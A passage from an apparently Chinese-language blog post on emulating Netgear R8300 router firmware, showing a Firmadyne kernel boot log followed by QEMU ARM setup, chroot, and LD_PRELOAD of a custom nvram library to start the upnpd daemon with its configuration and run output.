(gic_set_type+0x0/0x48)</span><br><span class="line">[    0.031310] genirq: Setting trigger mode 1 for irq 23 failed (gic_set_type+0x0/0x48)</span><br><span class="line">[    0.031466] genirq: Setting trigger mode 1 for irq 24 failed (gic_set_type+0x0/0x48)</span><br><span class="line">[    0.031614] genirq: Setting trigger mode 1 for irq 25 failed (gic_set_type+0x0/0x48)</span><br><span class="line">[    0.031756] genirq: Setting trigger mode 1 for irq 26 failed (gic_set_type+0x0/0x48)</span><br><span class="line">[    0.031900] genirq: Setting trigger mode 1 for irq 27 failed (gic_set_type+0x0/0x48)</span><br><span class="line">[    0.032378] genirq: Setting trigger mode 1 for irq 28 failed (gic_set_type+0x0/0x48)</span><br><span class="line">[    0.032530] genirq: Setting trigger mode 1 for irq 29 failed (gic_set_type+0x0/0x48)</span><br><span class="line">[    0.032670] genirq: Setting trigger mode 1 for irq 30 failed (gic_set_type+0x0/0x48)</span><br><span class="line">[    0.032819] genirq: Setting trigger mode 1 for irq 31 failed (gic_set_type+0x0/0x48)</span><br><span class="line">[    0.032959] genirq: Setting trigger mode 1 for irq 32 failed (gic_set_type+0x0/0x48)</span><br><span class="line">[    0.033118] genirq: Setting trigger mode 1 for irq 33 failed (gic_set_type+0x0/0x48)</span><br><span class="line">[    0.033256] genirq: Setting trigger mode 1 for irq 34 failed (gic_set_type+0x0/0x48)</span><br><span class="line">[    0.033394] genirq: Setting trigger mode 1 for irq 35 failed (gic_set_type+0x0/0x48)</span><br><span class="line">[    0.033536] genirq: Setting trigger mode 1 for irq 36 failed (gic_set_type+0x0/0x48)</span><br><span class="line">[    0.033681] genirq: Setting trigger mode 1 for irq 37 failed (gic_set_type+0x0/0x48)</span><br><span class="line">[    0.033849] genirq: Setting trigger mode 1 for irq 38 failed (gic_set_type+0x0/0x48)</span><br><span class="line">[    0.034017] genirq: Setting trigger mode 1 for irq 39 failed (gic_set_type+0x0/0x48)</span><br><span class="line">[    0.034163] genirq: Setting trigger mode 1 for irq 40 failed (gic_set_type+0x0/0x48)</span><br><span class="line">[    0.034311] genirq: Setting trigger mode 1 for irq 41 failed (gic_set_type+0x0/0x48)</span><br><span class="line">[    0.034462] genirq: Setting trigger mode 1 for irq 42 failed (gic_set_type+0x0/0x48)</span><br><span class="line">[    0.034612] genirq: Setting trigger mode 1 for irq 43 failed (gic_set_type+0x0/0x48)</span><br><span class="line">[    0.034766] genirq: Setting trigger mode 1 for irq 44 failed (gic_set_type+0x0/0x48)</span><br><span class="line">[    0.034921] genirq: Setting trigger mode 1 for irq 45 failed (gic_set_type+0x0/0x48)</span><br><span class="line">[    0.035088] genirq: Setting trigger mode 1 for irq 46 failed (gic_set_type+0x0/0x48)</span><br><span class="line">[    0.035258] genirq: Setting trigger mode 1 for irq 47 failed (gic_set_type+0x0/0x48)</span><br><span class="line">[    0.035408] genirq: Setting trigger mode 1 for irq 48 failed (gic_set_type+0x0/0x48)</span><br><span class="line">[    0.035554] genirq: Setting trigger mode 1 for irq 49 failed (gic_set_type+0x0/0x48)</span><br><span class="line">[    0.035698] genirq: Setting trigger mode 1 for irq 50 failed (gic_set_type+0x0/0x48)</span><br><span class="line">[    0.035841] genirq: Setting trigger mode 1 for irq 51 failed (gic_set_type+0x0/0x48)</span><br><span class="line">[    0.036126] genirq: Setting trigger mode 1 for irq 52 failed (gic_set_type+0x0/0x48)</span><br><span class="line">[    0.037808] Serial: AMBA PL011 UART driver</span><br><span class="line">[    0.038739] 9000000.pl011: ttyS0 at MMIO 0x9000000 (irq = 52, base_baud = 0) is a PL011 rev1</span><br><span class="line">[    0.093732] console [ttyS0] enabled</span><br><span class="line">[    0.106203] vgaarb: loaded</span><br><span class="line">[    0.108624] SCSI subsystem initialized</span><br><span class="line">[    0.111674] usbcore: registered new interface driver usbfs</span><br><span class="line">[    0.115340] usbcore: registered new interface driver hub</span><br><span class="line">[    0.118879] usbcore: registered new device driver usb</span><br><span class="line">[    0.126521] cfg80211: Calling CRDA to update world regulatory domain</span><br><span class="line">[    0.133497] Switched to clocksource arch_sys_counter</span><br><span class="line">[    0.147183] NET: Registered protocol family 2</span><br><span class="line">[    0.152842] TCP established hash table entries: 2048 (order: 1, 8192 bytes)</span><br><span class="line">[    0.158337] TCP bind hash table entries: 2048 (order: 1, 8192 bytes)</span><br><span class="line">[    0.162885] TCP: Hash tables configured (established 2048 bind 2048)</span><br><span class="line">[    0.167385] UDP hash table entries: 256 (order: 0, 4096 bytes)</span><br><span class="line">[    0.171595] UDP-Lite hash table entries: 256 (order: 0, 4096 bytes)</span><br><span class="line">[    0.176698] NET: Registered protocol family 1</span><br><span class="line">[    0.179833] PCI: CLS 0 bytes, default 64</span><br><span class="line">[    0.185928] NetWinder Floating Point Emulator V0.97 (extended precision)</span><br><span class="line">[    0.192393] futex hash table entries: 256 (order: -1, 3072 bytes)</span><br><span class="line">[    0.201353] squashfs: version 4.0 (2009/01/31) Phillip Lougher</span><br><span class="line">[    0.207858] jffs2: version 2.2. (NAND) © 2001-2006 Red Hat, Inc.</span><br><span class="line">[    0.212517] romfs: ROMFS MTD (C) 2007 Red Hat, Inc.</span><br><span class="line">[    0.219896] Block layer SCSI generic (bsg) driver version 0.4 loaded (major 253)</span><br><span class="line">[    0.225512] io scheduler noop registered</span><br><span class="line">[    0.228340] io scheduler cfq registered (default)</span><br><span class="line">[    0.232063] firmadyne: devfs: 1, execute: 1, procfs: 1, syscall: 0</span><br><span class="line">[    0.237165] ------------[ cut here ]------------</span><br><span class="line">[    0.240536] WARNING: CPU: 0 PID: 1 at /home/vagrant/firmadyne-kernel/kernel-v4.1/fs/sysfs/dir.c:31 sysfs_warn_dup+0x50/0x6c()</span><br><span class="line">[    0.248160] sysfs: cannot create duplicate filename &apos;/class/gpio&apos;</span><br><span class="line">[    0.252258] Modules linked in:</span><br><span class="line">[    0.254810] CPU: 0 PID: 1 Comm: swapper Not tainted 4.1.17+ #1</span><br><span class="line">[    0.259118] Hardware name: Generic DT based system</span><br><span class="line">[    0.262292] [&lt;c001c99c&gt;] (unwind_backtrace) from [&lt;c0019d30&gt;] (show_stack+0x10/0x14)</span><br><span class="line">[    0.262401] [&lt;c0019d30&gt;] (show_stack) from [&lt;c0024ab4&gt;] (warn_slowpath_common+0x80/0xa8)</span><br><span class="line">[    0.262472] [&lt;c0024ab4&gt;] (warn_slowpath_common) from [&lt;c0024b08&gt;] (warn_slowpath_fmt+0x2c/0x3c)</span><br><span class="line">[    0.262560] [&lt;c0024b08&gt;] (warn_slowpath_fmt) from [&lt;c00e363c&gt;] (sysfs_warn_dup+0x50/0x6c)</span><br><span class="line">[    0.262619] [&lt;c00e363c&gt;] (sysfs_warn_dup) from [&lt;c00e3714&gt;] (sysfs_create_dir_ns+0x74/0x84)</span><br><span class="line">[    0.262679] [&lt;c00e3714&gt;] (sysfs_create_dir_ns) from [&lt;c018e6ac&gt;] (kobject_add_internal+0xb8/0x2ac)</span><br><span class="line">[    0.262742] [&lt;c018e6ac&gt;] (kobject_add_internal) from [&lt;c018e9a8&gt;] (kset_register+0x1c/0x44)</span><br><span class="line">[    0.262801] [&lt;c018e9a8&gt;] (kset_register) from [&lt;c02090b4&gt;] (__class_register+0xa8/0x198)</span><br><span class="line">[    0.262860] [&lt;c02090b4&gt;] (__class_register) from [&lt;c02091e4&gt;] (__class_create+0x40/0x70)</span><br><span class="line">[    0.262918] [&lt;c02091e4&gt;] (__class_create) from [&lt;c01adf68&gt;] (register_devfs_stubs+0x314/0xbb4)</span><br><span class="line">[    0.262981] [&lt;c01adf68&gt;] (register_devfs_stubs) from [&lt;c05d9b08&gt;] (init_module+0x28/0xa4)</span><br><span class="line">[    0.263053] [&lt;c05d9b08&gt;] (init_module) from [&lt;c0009670&gt;] (do_one_initcall+0x104/0x1b4)</span><br><span class="line">[    0.263113] [&lt;c0009670&gt;] (do_one_initcall) from [&lt;c05c7d08&gt;] (kernel_init_freeable+0xf0/0x1b0)</span><br><span class="line">[    0.263229] [&lt;c05c7d08&gt;] (kernel_init_freeable) from [&lt;c040f28c&gt;] (kernel_init+0x8/0xe4)</span><br><span class="line">[    0.263287] [&lt;c040f28c&gt;] (kernel_init) from [&lt;c0016da8&gt;] (ret_from_fork+0x14/0x2c)</span><br><span class="line">[    0.263383] ---[ end trace b31221f46a8dc90e ]---</span><br><span class="line">[    0.263460] ------------[ cut here ]------------</span><br><span class="line">[    0.263502] WARNING: CPU: 0 PID: 1 at /home/vagrant/firmadyne-kernel/kernel-v4.1/lib/kobject.c:240 kobject_add_internal+0x240/0x2ac()</span><br><span class="line">[    0.263572] kobject_add_internal failed for gpio with -EEXIST, don&apos;t try to register things with the same name in the same directory.</span><br><span class="line">[    0.263639] Modules linked in:</span><br><span class="line">[    0.263699] CPU: 0 PID: 1 Comm: swapper Tainted: G        W       4.1.17+ #1</span><br><span class="line">[    0.263744] Hardware name: Generic DT based system</span><br><span class="line">[    0.263788] [&lt;c001c99c&gt;] (unwind_backtrace) from [&lt;c0019d30&gt;] (show_stack+0x10/0x14)</span><br><span class="line">[    0.263846] [&lt;c0019d30&gt;] (show_stack) from [&lt;c0024ab4&gt;] (warn_slowpath_common+0x80/0xa8)</span><br><span class="line">[    0.263906] [&lt;c0024ab4&gt;] (warn_slowpath_common) from [&lt;c0024b08&gt;] (warn_slowpath_fmt+0x2c/0x3c)</span><br><span class="line">[    0.263970] [&lt;c0024b08&gt;] (warn_slowpath_fmt) from [&lt;c018e834&gt;] (kobject_add_internal+0x240/0x2ac)</span><br><span class="line">[    0.264032] [&lt;c018e834&gt;] (kobject_add_internal) from [&lt;c018e9a8&gt;] (kset_register+0x1c/0x44)</span><br><span class="line">[    0.264091] [&lt;c018e9a8&gt;] (kset_register) from [&lt;c02090b4&gt;] (__class_register+0xa8/0x198)</span><br><span class="line">[    0.268034] [&lt;c02090b4&gt;] (__class_register) from [&lt;c02091e4&gt;] (__class_create+0x40/0x70)</span><br><span class="line">[    0.275667] [&lt;c02091e4&gt;] (__class_create) from [&lt;c01adf68&gt;] (register_devfs_stubs+0x314/0xbb4)</span><br><span class="line">[    0.280619] [&lt;c01adf68&gt;] (register_devfs_stubs) from [&lt;c05d9b08&gt;] (init_module+0x28/0xa4)</span><br><span class="line">[    0.285445] [&lt;c05d9b08&gt;] (init_module) from [&lt;c0009670&gt;] (do_one_initcall+0x104/0x1b4)</span><br><span class="line">[    0.289737] [&lt;c0009670&gt;] (do_one_initcall) from [&lt;c05c7d08&gt;] (kernel_init_freeable+0xf0/0x1b0)</span><br><span class="line">[    0.290664] [&lt;c05c7d08&gt;] (kernel_init_freeable) from [&lt;c040f28c&gt;] (kernel_init+0x8/0xe4)</span><br><span class="line">[    0.290727] [&lt;c040f28c&gt;] (kernel_init) from [&lt;c0016da8&gt;] (ret_from_fork+0x14/0x2c)</span><br><span class="line">[    0.290797] ---[ end trace b31221f46a8dc90f ]---</span><br><span class="line">[    0.290872] firmadyne: Cannot create device class: gpio!</span><br><span class="line">[    0.291677] firmadyne: Cannot register character device: watchdog, 0xa, 0x82!</span><br><span class="line">[    0.291743] firmadyne: Cannot register character device: wdt, 0xfd, 0x0!</span><br><span class="line">[    0.345419] Non-volatile memory driver v1.3</span><br><span class="line">[    0.360206] brd: module loaded</span><br><span class="line">[    0.368143] loop: module loaded</span><br><span class="line">[    0.375773]  vda: vda1</span><br><span class="line">[    0.380587] [nandsim] warning: read_byte: unexpected data output cycle, state is STATE_READY return 0x0</span><br><span class="line">[    0.387584] [nandsim] warning: read_byte: unexpected data output cycle, state is STATE_READY return 0x0</span><br><span class="line">[    0.394469] [nandsim] warning: read_byte: unexpected data output cycle, state is STATE_READY return 0x0</span><br><span class="line">[    0.401256] [nandsim] warning: read_byte: unexpected data output cycle, state is STATE_READY return 0x0</span><br><span class="line">[    0.402697] [nandsim] warning: read_byte: unexpected data output cycle, state is STATE_READY return 0x0</span><br><span class="line">[    0.402848] [nandsim] warning: read_byte: unexpected data output cycle, state is STATE_READY return 0x0</span><br><span class="line">[    0.403058] nand: device found, Manufacturer ID: 0x98, Chip ID: 0x39</span><br><span class="line">[    0.403112] nand: Toshiba NAND 128MiB 1,8V 8-bit</span><br><span class="line">[    0.403158] nand: 128 MiB, SLC, erase size: 16 KiB, page size: 512, OOB size: 16</span><br><span class="line">[    0.403555] flash size: 128 MiB</span><br><span class="line">[    0.403585] page size: 512 bytes</span><br><span class="line">[    0.403612] OOB area size: 16 bytes</span><br><span class="line">[    0.403640] sector size: 16 KiB</span><br><span class="line">[    0.403665] pages number: 262144</span><br><span class="line">[    0.403690] pages per sector: 32</span><br><span class="line">[    0.403715] bus width: 8</span><br><span class="line">[    0.405652] bits in sector size: 14</span><br><span class="line">[    0.408186] bits in page size: 9</span><br><span class="line">[    0.410586] bits in OOB size: 4</span><br><span class="line">[    0.412941] flash size with OOB: 135168 KiB</span><br><span class="line">[    0.416112] page address bytes: 4</span><br><span class="line">[    0.418491] sector address bytes: 3</span><br><span class="line">[    0.421054] options: 0x42</span><br><span class="line">[    0.423632] Scanning device for bad blocks</span><br><span class="line">[    0.497574] Creating 11 MTD partitions on &quot;NAND 128MiB 1,8V 8-bit&quot;:</span><br><span class="line">[    0.504589] 0x000000000000-0x000000100000 : &quot;NAND simulator partition 0&quot;</span><br><span class="line">[    0.510956] 0x000000100000-0x000000200000 : &quot;NAND simulator partition 1&quot;</span><br><span class="line">[    0.517483] 0x000000200000-0x000000300000 : &quot;NAND simulator partition 2&quot;</span><br><span class="line">[    0.523079] 0x000000300000-0x000000400000 : &quot;NAND simulator partition 3&quot;</span><br><span class="line">[    0.528404] 0x000000400000-0x000000500000 : &quot;NAND simulator partition 4&quot;</span><br><span class="line">[    0.533683] 0x000000500000-0x000000600000 : &quot;NAND simulator partition 5&quot;</span><br><span class="line">[    0.538960] 0x000000600000-0x000000700000 : &quot;NAND simulator partition 6&quot;</span><br><span class="line">[    0.544362] 0x000000700000-0x000000800000 : &quot;NAND simulator partition 7&quot;</span><br><span class="line">[    0.549586] 0x000000800000-0x000000900000 : &quot;NAND simulator partition 8&quot;</span><br><span class="line">[    0.554998] 0x000000900000-0x000000a00000 : &quot;NAND simulator partition 9&quot;</span><br><span class="line">[    0.560167] 0x000000a00000-0x000008000000 : &quot;NAND simulator partition 10&quot;</span><br><span class="line">[    0.568706] tun: Universal TUN/TAP device driver, 1.6</span><br><span class="line">[    0.573024] tun: (C) 1999-2004 Max Krasnyansky &lt;maxk@qualcomm.com&gt;</span><br><span class="line">[    0.584170] PPP generic driver version 2.4.2</span><br><span class="line">[    0.587727] PPP BSD Compression module registered</span><br><span class="line">[    0.591009] PPP Deflate Compression module registered</span><br><span class="line">[    0.594922] PPP MPPE Compression module registered</span><br><span class="line">[    0.598416] NET: Registered protocol family 24</span><br><span class="line">[    0.601736] PPTP driver version 0.8.5</span><br><span class="line">[    0.604905] usbcore: registered new interface driver usb-storage</span><br><span class="line">[    0.610485] hidraw: raw HID events driver (C) Jiri Kosina</span><br><span class="line">[    0.614655] usbcore: registered new interface driver usbhid</span><br><span class="line">[    0.618555] usbhid: USB HID core driver</span><br><span class="line">[    0.621686] Netfilter messages via NETLINK v0.30.</span><br><span class="line">[    0.625702] nf_conntrack version 0.5.0 (3958 buckets, 15832 max)</span><br><span class="line">[    0.630752] ctnetlink v0.93: registering with nfnetlink.</span><br><span class="line">[    0.635472] ipip: IPv4 over IPv4 tunneling driver</span><br><span class="line">[    0.639820] gre: GRE over IPv4 demultiplexor driver</span><br><span class="line">[    0.643303] ip_gre: GRE over IPv4 tunneling driver</span><br><span class="line">[    0.649259] ip_tables: (C) 2000-2006 Netfilter Core Team</span><br><span class="line">[    0.655447] arp_tables: (C) 2002 David S. Miller</span><br><span class="line">[    0.660480] Initializing XFRM netlink socket</span><br><span class="line">[    0.664155] NET: Registered protocol family 10</span><br><span class="line">[    0.670172] ip6_tables: (C) 2000-2006 Netfilter Core Team</span><br><span class="line">[    0.674635] sit: IPv6 over IPv4 tunneling driver</span><br><span class="line">[    0.680072] NET: Registered protocol family 17</span><br><span class="line">[    0.683649] bridge: automatic filtering via arp/ip/ip6tables has been deprecated. Update your scripts to load br_netfilter if you need this.</span><br><span class="line">[    0.692092] Bridge firewalling registered</span><br><span class="line">[    0.694840] Ebtables v2.0 registered</span><br><span class="line">[    0.697697] 8021q: 802.1Q VLAN Support v1.8</span><br><span class="line">[    0.700677] Registering SWP/SWPB emulation handler</span><br><span class="line">[    0.705032] hctosys: unable to open rtc device (rtc0)</span><br><span class="line">[    0.713464] EXT4-fs (vda1): couldn&apos;t mount as ext3 due to feature incompatibilities</span><br><span class="line">[    0.721943] EXT4-fs (vda1): mounting ext2 file system using the ext4 subsystem</span><br><span class="line">[    0.732941] EXT4-fs (vda1): warning: mounting unchecked fs, running e2fsck is recommended</span><br><span class="line">[    0.740503] EXT4-fs (vda1): mounted filesystem without journal. Opts: (null)</span><br><span class="line">[    0.745898] VFS: Mounted root (ext2 filesystem) on device 254:1.</span><br><span class="line">[    0.752726] Freeing unused kernel memory: 180K (c05c7000 - c05f4000)</span><br><span class="line">[    0.790000] random: init urandom read with 3 bits of entropy available</span><br><span class="line">nvram_get_buf: time_zone</span><br><span class="line">sem_lock: Triggering NVRAM initialization!</span><br><span class="line">nvram_init: Initializing NVRAM...</span><br><span class="line">sem_get: Key: 410160c4</span><br><span class="line">nvram_init: Unable to touch Ralink PID file: /var/run/nvramd.pid!</span><br><span class="line">sem_get: Key: 410c0019</span><br><span class="line">nvram_set_default_builtin: Setting built-in default values!</span><br><span class="line">nvram_set: console_loglevel = &quot;7&quot;</span><br><span class="line">sem_get: Key: 410c0019</span><br><span class="line">sem_get: Waiting for semaphore initialization (Key: 410c0019, Semaphore: 8001)...</span><br><span class="line">sem_get: Waiting for semaphore initialization (Key: 410c0019, Semaphore: 8001)...</span><br><span class="line">sem_get: Waiting for semaphore initialization (Key: 410c0019, Semaphore: 8001)...</span><br><span class="line">sem_get: Waiting for semaphore initialization (Key: 410c0019, Semaphore: 8001)...</span><br><span class="line">sem_get: Waiting for semaphore initialization (Key: 410c0019, Semaphore: 8001)...</span><br><span class="line">sem_get: Waiting for semaphore initialization (Key: 410c0019, Semaphore: 8001)...</span><br><span class="line">sem_get: Waiting for semaphore initialization (Key: 410c0019, Semaphore: 8001)...</span><br><span class="line">sem_get: Waiting for semaphore initialization (Key: 410c0019, Semaphore: 8001)...</span><br><span class="line">sem_get: Waiting for semaphore initialization (Key: 410c0019, Semaphore: 8001)...</span><br><span class="line">sem_get: Waiting for semaphore initialization (Key: 410c0019, Semaphore: 8001)...</span><br><span class="line">sem_lock: Unable to get semaphore!</span><br></pre></td></tr></table></figure>
+<h3 id="Qemu自定义"><a href="#Qemu自定义" class="headerlink" title="Qemu自定义"></a>Qemu自定义</h3><ol>
+<li><strong>配置arm虚拟机</strong></li>
+</ol>
+<p>使用Qemu模拟固件需要下载对应的arm虚拟机镜像，内核和initrd。<br><a href="https://people.debian.org/~aurel32/qemu/armhf/" target="_blank" rel="noopener">https://people.debian.org/~aurel32/qemu/armhf/</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[debian_wheezy_armhf_desktop.qcow2](https://people.debian.org/~aurel32/qemu/armhf/debian_wheezy_armhf_desktop.qcow2)  2013-12-17 02:43  1.7G   [debian_wheezy_armhf_standard.qcow2](https://people.debian.org/~aurel32/qemu/armhf/debian_wheezy_armhf_standard.qcow2) 2013-12-17 00:04  229M   </span><br><span class="line">[initrd.img-3.2.0-4-vexpress](https://people.debian.org/~aurel32/qemu/armhf/initrd.img-3.2.0-4-vexpress)        2013-12-17 01:57  2.2M   </span><br><span class="line">[vmlinuz-3.2.0-4-vexpress](https://people.debian.org/~aurel32/qemu/armhf/vmlinuz-3.2.0-4-vexpress)           2013-09-20 18:33  1.9M</span><br></pre></td></tr></table></figure>
+<p>标准的虚拟机启动命令为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">- qemu-system-arm -M vexpress-a9 -kernel vmlinuz-3.2.0-4-vexpress -initrd initrd.img-3.2.0-4-vexpress -drive if=sd,file=debian_wheezy_armhf_standard.qcow2 -append &quot;root=/dev/mmcblk0p2&quot;</span><br><span class="line">- qemu-system-arm -M vexpress-a9 -kernel vmlinuz-3.2.0-4-vexpress -initrd initrd.img-3.2.0-4-vexpress -drive if=sd,file=debian_wheezy_armhf_desktop.qcow2 -append &quot;root=/dev/mmcblk0p2&quot;</span><br></pre></td></tr></table></figure>
+<p>对于R8300固件，在 Host 机上创建一个 tap 接口并分配 IP，启动虚拟机：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">`sudo tunctl -t tap0 -u `whoami`</span><br><span class="line">sudo ifconfig tap0 192.168.2.1/24</span><br><span class="line">qemu-system-arm -M vexpress-a9 -kernel vmlinuz-3.2.0-4-vexpress -initrd initrd.img-3.2.0-4-vexpress -drive if=sd,file=debian_wheezy_armhf_standard.qcow2 -append &quot;root=/dev/mmcblk0p2&quot; -net nic -net tap,ifname=tap0,script=no,downscript=no -nographic`</span><br></pre></td></tr></table></figure>
+<p>与标准命令区别在于<code>-net nic -net tap,ifname=tap0,script=no,downscript=no -nographic</code><br>启动之后输入用户名和密码，都是 root，为虚拟机分配 IP：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`root@debian-armhf:~# ifconfig eth0 ``192.168``.``2.2``/``24`</span><br></pre></td></tr></table></figure>
+<p>这样 Host 和虚拟机就网络互通了，然后挂载 proc、dev，最后 chroot 即可。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">`root@debian-armhf:~# mount -t proc /proc ./squashfs-root/proc</span><br><span class="line">root@debian-armhf:~# mount -o bind /dev ./squashfs-root/dev</span><br><span class="line">root@debian-armhf:~# chroot ./squashfs-root/ sh`</span><br></pre></td></tr></table></figure>
+<ol>
+<li><strong>修复依赖</strong></li>
+</ol>
+<p>NVRAM( 非易失性 RAM) 用于存储路由器的配置信息，而 upnpd 运行时需要用到其中部分配置信息。在没有硬件设备的情况下，我们可以使用 <code>LD_PRELOAD</code> 劫持以下函数符号。手动创建 <code>/tmp/var/run</code> 目录，再次运行提示缺少 <code>/dev/nvram</code>。</p>
+<ul>
+<li><p>编译nvram.so</p>
+<p><a href="https://raw.githubusercontent.com/therealsaumil/custom_nvram/master/custom_nvram_r6250.c" target="_blank" rel="noopener">https://raw.githubusercontent.com/therealsaumil/custom_nvram/master/custom_nvram_r6250.c</a></p>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ arm-linux-gcc -Wall -fPIC -shared nvram.c  -o nvram.so</span><br></pre></td></tr></table></figure>
+<ul>
+<li>劫持<code>dlsym</code></li>
+</ul>
+<p>nvram库的实现者还同时 hook 了 <code>system</code>、<code>fopen</code>、<code>open</code> 等函数，因此还会用到 <code>dlsym</code>，<code>/lib/libdl.so.0</code>导出了该符号。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">`$ grep ``-``r ``&quot;dlsym&quot;`` ``.`</span><br><span class="line">`Binary`` file ``./``lib``/``libcrypto``.``so``.``1.0``.``0`` matches`</span><br><span class="line">`Binary`` file ``./``lib``/``libdl``.``so``.``0`` matches`</span><br><span class="line">`Binary`` file ``./``lib``/``libhcrypto``-``samba4``.``so``.``5`` matches`</span><br><span class="line">`Binary`` file ``./``lib``/``libkrb5``-``samba4``.``so``.``26`` matches`</span><br><span class="line">`Binary`` file ``./``lib``/``libldb``.``so``.``1`` matches`</span><br><span class="line">`Binary`` file ``./``lib``/``libsamba``-``modules``-``samba4``.``so matches`</span><br><span class="line">`Binary`` file ``./``lib``/``libsqlite3``.``so``.``0`` matches`</span><br><span class="line">`grep``:`` ``./``lib``/``modules``/``2.6``.``36.4brcmarm``+:`` ``No`` such file ``or`` directory`</span><br><span class="line"></span><br><span class="line">$ `readelf ``-``a `**`./``lib``/``libdl``.``so``.`**`**0**`` ``|`` grep dlsym`</span><br><span class="line">`    ``26``:`` ``000010f0``   ``296`` FUNC    GLOBAL DEFAULT    ``7`` dlsym`</span><br></pre></td></tr></table></figure>
+<ul>
+<li>配置tmp/nvram.ini信息</li>
+</ul>
+<p>接下来要做的就是根据上面的日志补全配置信息，也可以参考<a href="https://github.com/zcutlip/nvram-faker/blob/master/nvram.ini。至于为什么这么设置，可以查看对应的汇编代码逻辑（配置的有问题的话很容易触发段错误）。" target="_blank" rel="noopener">https://github.com/zcutlip/nvram-faker/blob/master/nvram.ini。至于为什么这么设置，可以查看对应的汇编代码逻辑（配置的有问题的话很容易触发段错误）。</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">`upnpd_debug_level=9</span><br><span class="line">lan_ipaddr=192.168.2.2</span><br><span class="line">hwver=R8500</span><br><span class="line">friendly_name=R8300</span><br><span class="line">upnp_enable=1</span><br><span class="line">upnp_turn_on=1</span><br><span class="line">upnp_advert_period=30</span><br><span class="line">upnp_advert_ttl=4</span><br><span class="line">upnp_portmap_entry=1</span><br><span class="line">upnp_duration=3600</span><br><span class="line">upnp_DHCPServerConfigurable=1</span><br><span class="line">wps_is_upnp=0</span><br><span class="line">upnp_sa_uuid=00000000000000000000</span><br><span class="line">lan_hwaddr=AA:BB:CC:DD:EE:FF`</span><br></pre></td></tr></table></figure>
+<ul>
+<li>运行过程</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">**# ./usr/sbin/upnpd**</span><br><span class="line"># /dev/nvram: No such file or directory</span><br><span class="line">/dev/nvram: No such file or directory</span><br><span class="line">/dev/nvram: No such file or directory</span><br><span class="line">/dev/nvram: No such file or directory</span><br><span class="line">/dev/nvram: No such file or directory</span><br><span class="line">/dev/nvram: No such file or directory</span><br><span class="line">/dev/nvram: No such file or directory</span><br><span class="line">/dev/nvram: No such file or directory</span><br><span class="line">/dev/nvram: No such file or directory</span><br><span class="line">/dev/nvram: No such file or directory</span><br><span class="line">/dev/nvram: No such file or directory</span><br><span class="line"></span><br><span class="line">**# LD_PRELOAD=&quot;./nvram.so&quot; ./usr/sbin/upnpd**</span><br><span class="line"># ./usr/sbin/upnpd: can&apos;t resolve symbol &apos;dlsym&apos;</span><br><span class="line"></span><br><span class="line">**# LD_PRELOAD=&quot;./nvram.so ./lib/libdl.so.0&quot; ./usr/sbin/upnpd**</span><br><span class="line"># [0x00026460] fopen(&apos;/var/run/upnpd.pid&apos;, &apos;wb+&apos;) = 0x00b19008</span><br><span class="line">[0x0002648c] custom_nvram initialised</span><br><span class="line">[0x76eb7cb8] **fopen****(&apos;/tmp/nvram.ini&apos;, &apos;r&apos;) = 0x00b19008**</span><br><span class="line">[nvram 0] upnpd_debug_level = 9</span><br><span class="line">[nvram 1] lan_ipaddr = 192.168.2.2</span><br><span class="line">[nvram 2] hwver = R8500</span><br><span class="line">[nvram 3] friendly_name = R8300</span><br><span class="line">[nvram 4] upnp_enable = 1</span><br><span class="line">[nvram 5] upnp_turn_on = 1</span><br><span class="line">[nvram 6] upnp_advert_period = 30</span><br><span class="line">[nvram 7] upnp_advert_ttl = 4</span><br><span class="line">[nvram 8] upnp_portmap_entry = 1</span><br><span class="line">[nvram 9] upnp_duration = 3600</span><br><span class="line">[nvram 10] upnp_DHCPServerConfigurable = 1</span><br><span class="line">[nvram 11] wps_is_upnp = 0</span><br><span class="line">[nvram 12] upnp_sa_uuid = 00000000000000000000</span><br><span class="line">[nvram 13] lan_hwaddr = AA:BB:CC:DD:EE:FF</span><br><span class="line">[nvram 14] lan_hwaddr =</span><br><span class="line">Read 15 entries from /tmp/nvram.ini</span><br><span class="line">acosNvramConfig_get(&apos;upnpd_debug_level&apos;) = &apos;9&apos;</span><br></pre></td></tr></table></figure>
